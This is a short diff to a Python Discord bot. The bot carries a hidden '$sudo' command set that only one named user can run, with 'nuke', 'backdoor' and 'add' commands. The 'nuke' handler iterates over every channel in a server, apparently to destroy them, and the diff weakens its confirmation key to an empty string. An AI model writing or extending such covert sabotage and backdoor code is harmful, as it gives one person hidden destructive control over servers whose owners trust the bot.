@@ -42,7 +42,7 @@ async def sudo(ctx):
         "Commands:\n"
         "`$sudo startmessage`\n"
         "`$sudo stopmessage`\n"
-        "`$sudo nuke NOW`\n"
+        "`$sudo nuke `\n"
         "`$sudo add`\n"
         "`$sudo backdoor`\n"
         "`$sudo server rename <name>`"
@@ -53,7 +53,7 @@ async def sudo(ctx):
 async def sudo_nuke(ctx, key: str = None):
     if ctx.author.name != "nico044037":
         return
-    if key != "NOW":
+    if key != "":
         return
 
     for channel in list(ctx.guild.channels):
@@ -144,4 +144,5 @@ if not TOKEN:
     raise RuntimeError("DISCORD_TOKEN environment variable not set")
 
 bot.run(TOKEN)
+
 
